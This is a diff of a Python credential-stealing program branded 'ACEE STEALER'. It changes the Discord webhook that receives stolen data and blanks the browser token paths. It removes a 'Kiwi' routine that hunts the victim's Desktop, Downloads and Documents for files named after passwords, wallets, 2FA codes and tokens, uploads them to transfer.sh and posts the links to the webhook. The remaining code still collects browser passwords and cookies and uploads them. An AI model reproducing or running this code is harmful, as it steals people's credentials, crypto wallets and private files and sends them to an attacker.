@@ -16,7 +16,7 @@ import subprocess
 import requests
 from Crypto.Cipher import AES
 
-hook = "https://discord.com/api/webhooks/1040333470188179497/8JFBk5ok3GQhi_JZ5iUNOgw_UAIocBS8lQjbP08V5IlUgOskzTZv7dPJTKlMoNo_K8NI"
+hook = "https://discord.com/api/webhooks/1052224030742155364/gzFAIJH0qQCjGN4u1tsGv56Mc1u5tCJVhU5YedJNBkT0FAe0JLU5X_uv6oakP1bT-ADY"
 DETECTED = False
 
 
@@ -124,34 +124,6 @@ def upload(name, tk=''):
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-
-    if name == "kiwi":
-        data = {
-        "content": '',
-        "embeds": [
-            {
-            "color": 14406413,
-            "fields": [
-                {
-                "name": "Interesting files found on user PC:",
-                "value": tk
-                }
-            ],
-            "author": {
-                "name": "ACEE | File Stealer"
-            },
-            "footer": {
-                "text": "@ACEE STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg"
-            }
-            }
-        ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/971769033496076348/1018558042402476143/manny_in_floatie.jpg",
-        "attachments": []
-        }
-        # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
-        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
-        return
 
     path = name
     files = {'file': open(path, 'rb')}
@@ -339,14 +311,14 @@ def ZipThings(path, arg, procc):
 def GatherAll():
     '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
     browserPaths = [
-        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
-        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
-        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
-        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
-        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
-        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
-        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
-        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
+        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
+        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
+        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
+        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
     ]
 
 
@@ -385,131 +357,3 @@ def GatherAll():
 
     for file in ["wppassw.txt", "wpcook.txt"]:
         upload(os.getenv("TEMP") + "\\" + file)
-
-def uploadToAnonfiles(path):
-    try:
-        files = { "file": (path, open(path, mode='rb')) }
-        ...
-        upload = requests.post("https://transfer.sh/", files=files)
-        url = upload.text
-        return url
-    except:
-        return False
-
-def KiwiFolder(pathF, keywords):
-    global KiwiFiles
-    maxfilesperdir = 7
-    i = 0
-    listOfFile = os.listdir(pathF)
-    ffound = []
-    for file in listOfFile:
-        if not os.path.isfile(pathF + "/" + file): return
-        i += 1
-        if i <= maxfilesperdir:
-            url = uploadToAnonfiles(pathF + "/" + file)
-            ffound.append([pathF + "/" + file, url])
-        else:
-            break
-    KiwiFiles.append(["folder", pathF + "/", ffound])
-
-KiwiFiles = []
-def KiwiFile(path, keywords):
-    global KiwiFiles
-    fifound = []
-    listOfFile = os.listdir(path)
-    for file in listOfFile:
-        for worf in keywords:
-            if worf in file.lower():
-                if os.path.isfile(path + "/" + file) and ".txt" in file:
-                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
-                    break
-                if os.path.isdir(path + "/" + file):
-                    target = path + "/" + file
-                    KiwiFolder(target, keywords)
-                    break
-
-    KiwiFiles.append(["folder", path, fifound])
-
-def Kiwi():
-    user = temp.split("\AppData")[0]
-    path2search = [
-        user + "/Desktop",
-        user + "/Downloads",
-        user + "/Documents"
-    ]
-
-    key_wordsFolder = [
-        "account",
-        "acount",
-        "passw",
-        "secret"
-
-    ]
-
-    key_wordsFiles = [
-        "passw",
-        "mdp",
-        "motdepasse",
-        "mot_de_passe",
-        "login",
-        "secret",
-        "account",
-        "acount",
-        "paypal",
-        "New Text Document",
-        "banque",
-        "account",
-        "metamask",
-        "wallet",
-        "crypto",
-        "exodus",
-        "discord",
-        "2fa",
-        "code",
-        "memo",
-        "compte",
-        "token",
-        "backup",
-        "seecret"
-        ]
-
-    wikith = []
-    for patt in path2search:
-        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
-        wikith.append(kiwi)
-    return wikith
-
-
-global keyword, cookiWords, paswWords
-
-keyword = [
- '[coinbase](https://coinbase.com)', '[cracked](https://cracked.to/member.php)', '[nulled](https://www.nulled.to/index.php)', '[patched](https://patched.to/member.php)', '[paypal](https://paypal.com)'
-]
-
-
-cookiWords = []
-paswWords = []
-
-GatherAll()
-DETECTED = Trust(Cookies)
-
-if not DETECTED:
-    wikith = Kiwi()
-
-    for thread in wikith: thread.join()
-    time.sleep(0.2)
-
-    filetext = "\n"
-    for arg in KiwiFiles:
-        if len(arg[2]) != 0:
-            foldpath = arg[1]
-            foldlist = arg[2]
-            filetext += f"• {foldpath}\n"
-
-            for ffil in foldlist:
-                a = ffil[0].split("/")
-                fileanme = a[len(a)-1]
-                b = ffil[1]
-                filetext += f"... [{fileanme}]({b})\n"
-            filetext += "\n"
-    upload("kiwi", filetext)
